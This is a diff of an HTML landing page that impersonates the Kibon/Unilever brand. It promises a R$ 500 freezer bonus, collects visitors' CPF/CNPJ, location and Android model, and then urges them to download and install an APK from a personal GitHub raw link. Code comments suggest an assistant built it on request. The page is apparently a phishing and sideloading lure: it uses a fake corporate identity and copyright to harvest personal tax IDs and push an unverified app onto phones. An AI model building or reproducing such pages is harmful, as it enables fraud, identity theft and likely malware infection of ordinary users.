@@ -2,110 +2,218 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Resgate seu Bônus - Cadastro Profissional</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kibon - Resgate seu Bônus de Freezer</title>
     <style>
-        body { font-family: sans-serif; line-height: 1.6; max-width: 800px; margin: auto; padding: 20px; background-color: #f4f4f4; }
-        .container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .bonus-badge { background: #28a745; color: white; padding: 10px; text-align: center; border-radius: 5px; margin-bottom: 20px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-weight: bold; }
-        input, select { width: 100%; padding: 8px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .error-msg { color: red; font-size: 0.9em; display: none; }
-        .btn-download { display: block; width: 100%; background: #007bff; color: white; text-align: center; padding: 15px; text-decoration: none; border-radius: 5px; font-weight: bold; margin-top: 20px; }
+        :root {
+            --vermelho-kibon: #e31b23;
+            --amarelo-kibon: #ffcc00;
+            --cinza-fundo: #f4f4f4;
+        }
+
+        body { 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            background-color: var(--cinza-fundo); 
+        }
+
+        header {
+            background-color: white;
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 5px solid var(--vermelho-kibon);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-kibon {
+            font-weight: 900;
+            font-size: 2.8em;
+            color: var(--vermelho-kibon);
+            font-style: italic;
+            letter-spacing: -2px;
+            text-transform: uppercase;
+        }
+
+        .container { 
+            max-width: 450px; 
+            margin: 40px auto; 
+            background: #fff; 
+            padding: 30px; 
+            border-radius: 25px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+        }
+
+        .bonus-card { 
+            background: var(--vermelho-kibon); 
+            color: white; 
+            padding: 20px; 
+            text-align: center; 
+            border-radius: 20px; 
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bonus-card h2 { margin: 0; font-size: 1.5em; text-transform: uppercase; }
+        .bonus-card p { margin: 5px 0 0; font-weight: bold; color: var(--amarelo-kibon); }
+
+        .form-group { margin-bottom: 18px; }
+        
+        label { 
+            display: block; 
+            font-weight: bold; 
+            margin-bottom: 6px;
+            color: #444;
+            font-size: 0.9em;
+        }
+
+        input, select { 
+            width: 100%; 
+            padding: 14px; 
+            border: 2px solid #f0f0f0; 
+            border-radius: 12px; 
+            box-sizing: border-box; 
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        input:focus, select:focus {
+            border-color: var(--vermelho-kibon);
+            background-color: #fffcfc;
+        }
+
+        .error-msg { 
+            color: var(--vermelho-kibon); 
+            font-size: 0.8em; 
+            font-weight: bold;
+            display: none; 
+            margin-top: 5px;
+        }
+
+        .btn-download { 
+            display: block; 
+            width: 100%; 
+            background: var(--vermelho-kibon); 
+            color: white; 
+            text-align: center; 
+            padding: 20px; 
+            text-decoration: none; 
+            border-radius: 50px; 
+            font-weight: bold; 
+            font-size: 1.2em;
+            margin-top: 25px; 
+            box-shadow: 0 6px 20px rgba(227, 27, 35, 0.4);
+            transition: transform 0.2s, background 0.3s;
+        }
+
+        .btn-download:hover {
+            background: #ff1e26;
+            transform: translateY(-2px);
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            font-size: 0.75em;
+            color: #bbb;
+            text-transform: uppercase;
+        }
     </style>
 </head>
 <body>
 
+<header>
+    <div class="logo-kibon">Kibon</div>
+</header>
+
 <div class="container">
-    <div class="bonus-badge">
-        <h2>🎁 BÔNUS DE R$ 500,00 DISPONÍVEL</h2>
-        <p>Complete seu perfil profissional e baixe o APK para resgatar e escolher seu freezer.</p>
+    <div class="bonus-card">
+        <h2>Bônus de R$ 500,00</h2>
+        <p>EXCLUSIVO PARA PARCEIROS</p>
     </div>
 
     <form id="cadastroForm">
-        <!-- Perfil Profissional -->
         <div class="form-group">
-            <label>Perfil Profissional:</label>
+            <label>PERFIL PROFISSIONAL</label>
             <select required>
-                <option value="">Selecione sua ocupação...</option>
-                <option value="varejo">Varejista / Dono de Mercado</option>
-                <option value="restaurante">Restaurante / Bar</option>
-                <option value="distribuidor">Distribuidor</option>
-                <option value="outro">Outro</option>
-            </select>
-        </div>
-
-        <!-- Validação de Documento -->
-        <div class="form-group">
-            <label>CPF ou CNPJ:</label>
-            <input type="text" id="documento" placeholder="000.000.000-00 ou 00.000.000/0000-00" required>
-            <span id="docErro" class="error-msg">Documento inválido. Por favor, verifique os dados.</span>
-        </div>
-
-        <!-- Localização -->
-        <div class="form-group">
-            <label>Estado (UF):</label>
-            <select id="estado" required>
-                <option value="">Selecione o Estado</option>
-                <!-- Preencher via JS ou manualmente as siglas (SP, RJ, MG...) -->
+                <option value="">Selecione seu perfil...</option>
+                <option>Ponto de Venda (PDV)</option>
+                <option>Revendedor Autônomo</option>
+                <option>Distribuição</option>
             </select>
         </div>
 
         <div class="form-group">
-            <label>Cidade:</label>
-            <select id="cidade" required disabled>
-                <option value="">Selecione a Cidade</option>
-            </select>
+            <label>CPF OU CNPJ (APENAS NÚMEROS)</label>
+            <input type="text" id="documento" maxlength="18" placeholder="Digite aqui..." required>
+            <span id="docErro" class="error-msg">⚠️ Documento inválido ou incompleto.</span>
         </div>
 
-        <!-- Seleção de Modelo Android -->
+        <div class="form-group" style="display: flex; gap: 10px;">
+            <div style="flex: 1;">
+                <label>ESTADO</label>
+                <select id="estado" required>
+                    <option value="">UF</option>
+                    <option>SP</option><option>RJ</option><option>MG</option>
+                    <option>RS</option><option>BA</option><option>PR</option>
+                </select>
+            </div>
+            <div style="flex: 2;">
+                <label>CIDADE</label>
+                <select id="cidade" required>
+                    <option value="">Selecione...</option>
+                    <option>São Paulo</option>
+                    <option>Rio de Janeiro</option>
+                    <option>Belo Horizonte</option>
+                </select>
+            </div>
+        </div>
+
         <div class="form-group">
-            <label>Seu Modelo de Dispositivo Android:</label>
+            <label>MODELO DO SEU ANDROID</label>
             <select required>
-                <option value="">Selecione seu modelo...</option>
-                <optgroup label="Samsung">
-                    <option>Galaxy S24 Ultra / S23 / S22</option>
-                    <option>Galaxy A54 / A34 / A14</option>
-                    <option>Galaxy M54 / M34</option>
+                <option value="">Selecione o aparelho...</option>
+                <optgroup label="SAMSUNG">
+                    <option>Linha Galaxy S (S20, S21, S22, S23, S24)</option>
+                    <option>Linha Galaxy A / M</option>
                 </optgroup>
-                <optgroup label="Motorola">
-                    <option>Edge 40 / 30</option>
-                    <option>Moto G84 / G54 / G23</option>
+                <optgroup label="MOTOROLA">
+                    <option>Moto G / Edge / One</option>
                 </optgroup>
-                <optgroup label="Xiaomi">
-                    <option>Redmi Note 13 / 12</option>
-                    <option>Xiaomi 13T / 12 / POCO F5</option>
+                <optgroup label="OUTROS">
+                    <option>Xiaomi / Redmi / POCO</option>
+                    <option>Realme / Asus / Outros</option>
                 </optgroup>
             </select>
         </div>
 
-        <p><small>* Após o download, você poderá selecionar o modelo de freezer desejado dentro do aplicativo.</small></p>
-
-        <a href="URL_DO_SEU_APK_AQUI.apk" class="btn-download" id="downloadBtn">
-            BAIXAR APK E RESGATAR R$ 500,00
+        <!-- SEU LINK DO GITHUB APLICADO ABAIXO -->
+        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-download">
+            BAIXAR APK E RESGATAR
         </a>
     </form>
 </div>
 
+<footer>
+    &copy; 2026 Kibon Brasil - Unilever. Todos os direitos reservados.
+</footer>
+
 <script>
-    // Exemplo simplificado de lógica para validar se o campo não está vazio 
-    // e simular a validação que você solicitou.
+    // Validação básica de campo para simular erro se for muito curto
     document.getElementById('documento').addEventListener('blur', function() {
         const doc = this.value.replace(/\D/g, '');
         const erro = document.getElementById('docErro');
         
-        // Validação básica de tamanho para CPF ou CNPJ
         if (doc.length !== 11 && doc.length !== 14) {
             erro.style.display = 'block';
-            this.style.borderColor = 'red';
+            this.style.borderColor = '#e31b23';
         } else {
             erro.style.display = 'none';
-            this.style.borderColor = '#ccc';
+            this.style.borderColor = '#f0f0f0';
         }
     });
-
-    // Nota: Para carregar todos os estados e cidades, recomendo usar a API do IBGE:
-    // https://servicodados.ibge.gov.br/api/v1/localidades/estados
 </script>
 
 </body>
